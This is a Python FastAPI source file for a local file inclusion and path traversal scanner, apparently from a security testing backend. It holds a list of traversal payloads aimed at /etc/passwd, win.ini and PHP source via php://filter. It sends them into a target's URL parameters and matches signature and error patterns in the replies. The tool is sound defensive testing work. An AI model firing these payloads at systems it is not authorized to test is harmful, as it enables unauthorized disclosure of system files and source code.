"""LFI / Path Traversal Scanner — High-Fidelity File Disclosure Detection.

Accurately classifies findings using verified file signatures:
- Confirmed: Unix passwd, Windows win.ini, or decodeable PHP base64 filter stream contents.
- Likely: Explicit file inclusion error disclosures (e.g. open_basedir, failed to open stream).
- Possible: Filesystem path disclosures in error messages.
- Not Detected: Benign length shifts without signature or error evidence.
"""
from __future__ import annotations
import base64
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
from typing import Any, Dict, List, Optional, Tuple

from fastapi import APIRouter
from pydantic import BaseModel, Field

from backend.security.confidence import (
    Confidence,
    Severity,
    create_finding,
    standard_response,
)
from backend.security.http_client import safe_request
from backend.security.logger import redact_secrets
from backend.security.target_validator import TargetValidationError, validate_target_url
from backend.tools.utils import clean_url, err, ok

router = APIRouter(tags=["scanning"])

# Known file signatures that verify real file disclosure
UNIX_PASSWD_SIGS = [
    r"root:x:0:0:[^:]*:/root:",
    r"daemon:x:[0-9]+:[0-9]+:",
    r"bin:x:[0-9]+:[0-9]+:",
    r"nobody:x:[0-9]+:[0-9]+:",
]

WINDOWS_INI_SIGS = [
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mci extensions\]",
    r"\[files\]",
]

LFI_ERROR_PATTERNS = [
    (r"open_basedir restriction in effect\. File\([^\)]+\) is not within the allowed path", "open_basedir restriction"),
    (r"failed to open stream:\s*No such file or directory", "PHP stream open error"),
    (r"failed to open stream:\s*Permission denied", "PHP permission denied"),
    (r"include\([^\)]+\):\s*failed to open stream", "PHP include failure"),
    (r"java\.io\.FileNotFoundException:", "Java file not found"),
    (r"System\.IO\.FileNotFoundException:", ".NET file not found"),
]

TRAVERSAL_PAYLOADS = [
    # Unix passwd
    ("../../../../etc/passwd", "Unix relative traversal"),
    ("....//....//....//etc/passwd", "Unix nested slash bypass"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded relative traversal"),
    ("/etc/passwd", "Unix direct path"),
    # Windows win.ini
    ("..\\..\\..\\windows\\win.ini", "Windows backslash traversal"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "Windows encoded backslash"),
    ("C:\\windows\\win.ini", "Windows direct drive path"),
    # PHP stream filter
    ("php://filter/convert.base64-encode/resource=index.php", "PHP base64 encode filter"),
]


class LFIRequest(BaseModel):
    target: str = Field(..., min_length=1, max_length=2048)
    depth: str = Field("medium", max_length=64)


def inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    return urlunparse(parsed._replace(query=urlencode(flat)))


@router.post("/lfi_scanner")
async def lfi_scanner(req: LFIRequest):
    url = clean_url(req.target)
    try:
        validate_target_url(url)
    except TargetValidationError as tve:
        return err(f"Target validation failed: {tve}")

    parsed = urlparse(url)
    existing_params = parse_qs(parsed.query, keep_blank_values=True)

    params_to_test = list(existing_params.keys())
    if not params_to_test:
        params_to_test = ["file", "page", "path", "include", "doc", "view", "template", "load"]

    findings: List[Dict[str, Any]] = []
    records: List[Dict[str, Any]] = []

    # Baseline request
    try:
        baseline_resp = await safe_request("GET", url, timeout=8.0)
        baseline_body = baseline_resp.text
    except Exception as e:
        return err(f"Failed to reach target: {e}")

    for param in params_to_test:
        param_confirmed = False
        for payload, desc in TRAVERSAL_PAYLOADS:
            test_url = inject_param(url, param, payload)

            try:
                resp = await safe_request("GET", test_url, timeout=7.0)
                body = resp.text

                # 1. Check Unix /etc/passwd signatures
                for u_sig in UNIX_PASSWD_SIGS:
                    if re.search(u_sig, body):
                        snippet = body[:200]
                        findings.append(create_finding(
                            title=f"LFI Confirmed (Unix /etc/passwd): param '{param}'",
                            severity="critical",
                            confidence=Confidence.CONFIRMED.value,
                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server returned /etc/passwd system credentials.",
                            recommendation="Never concatenate user input into filesystem APIs. Validate filenames against an absolute allowlist or ID lookup table.",
                            evidence=redact_secrets(snippet),
                        ))
                        records.append({
                            "Parameter": param,
                            "Payload": payload,
                            "Confidence": "confirmed",
                            "Result": "💀 CONFIRMED LFI (/etc/passwd)",
                        })
                        param_confirmed = True
                        break
                if param_confirmed:
                    break

                # 2. Check Windows win.ini signatures
                for w_sig in WINDOWS_INI_SIGS:
                    if re.search(w_sig, body, re.IGNORECASE):
                        findings.append(create_finding(
                            title=f"LFI Confirmed (Windows win.ini): param '{param}'",
                            severity="critical",
                            confidence=Confidence.CONFIRMED.value,
                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server returned Windows system configuration file contents.",
                            recommendation="Do not use raw user parameters in path construction. Enforce basename extraction and path sandboxing.",
                            evidence=f"Matched Windows signature: {w_sig}",
                        ))
                        records.append({
                            "Parameter": param,
                            "Payload": payload,
                            "Confidence": "confirmed",
                            "Result": "💀 CONFIRMED LFI (win.ini)",
                        })
                        param_confirmed = True
                        break
                if param_confirmed:
                    break

                # 3. Check PHP filter base64 stream decode
                if "php://filter" in payload and len(body) > 30:
                    # Look for base64 strings containing <?php
                    b64_matches = re.findall(r'[A-Za-z0-9+/=]{40,}', body)
                    for candidate in b64_matches:
                        try:
                            decoded = base64.b64decode(candidate).decode('utf-8', errors='ignore')
                            if "<?php" in decoded or "namespace" in decoded or "__construct" in decoded:
                                findings.append(create_finding(
                                    title=f"LFI Source Code Disclosure (Confirmed): param '{param}'",
                                    severity="critical",
                                    confidence=Confidence.CONFIRMED.value,
                                    detail=f"PHP base64 filter successfully extracted and decoded server-side source code via parameter '{param}'.",
                                    recommendation="Disable php:// stream wrappers and restrict file includes.",
                                    evidence=redact_secrets(decoded[:150]),
                                ))
                                records.append({
                                    "Parameter": param,
                                    "Payload": payload,
                                    "Confidence": "confirmed",
                                    "Result": "💀 CONFIRMED SOURCE LEAK",
                                })
                                param_confirmed = True
                                break
                        except Exception:
                            pass
                if param_confirmed:
                    break

                # 4. Check LFI Error Disclosures (Likely)
                for err_pat, err_name in LFI_ERROR_PATTERNS:
                    m = re.search(err_pat, body, re.IGNORECASE)
                    if m:
                        findings.append(create_finding(
                            title=f"LFI File Inclusion Trace (Likely): param '{param}'",
                            severity="high",
                            confidence=Confidence.LIKELY.value,
                            detail=f"Injected payload '{payload}' into parameter '{param}'. The server revealed a file system inclusion error: {err_name}.",
                            recommendation="Sanitize user input and prevent filesystem errors from propagating to output.",
                            evidence=m.group(0)[:150],
                        ))
                        records.append({
                            "Parameter": param,
                            "Payload": payload,
                            "Confidence": "likely",
                            "Result": f"🔥 LIKELY LFI ({err_name})",
                        })
                        param_confirmed = True
                        break
                if param_confirmed:
                    break

            except Exception:
                pass

        if not param_confirmed:
            records.append({
                "Parameter": param,
                "Payload": "Standard Traversal Set",
                "Confidence": "not_detected",
                "Result": "Filtered / Safe",
            })

    if not findings:
        findings.append(create_finding(
            title="No LFI / Path Traversal Detected",
            severity="info",
            confidence=Confidence.NOT_DETECTED.value,
            detail="The tested parameters did not leak system files or inclusion error traces.",
            recommendation="Continue enforcing path validation and file allowlists.",
        ))

    confirmed_count = sum(1 for f in findings if f.get("confidence") == "confirmed")
    likely_count = sum(1 for f in findings if f.get("confidence") == "likely")

    return ok({
        "summary": {
            "Target": url,
            "Parameters Tested": len(params_to_test),
            "Confirmed LFI": confirmed_count,
            "Likely LFI": likely_count,
            "Status": "Vulnerable" if (confirmed_count or likely_count) else "Secure",
        },
        "findings": findings,
        "records": records,
        "record_columns": ["Parameter", "Payload", "Confidence", "Result"],
    })
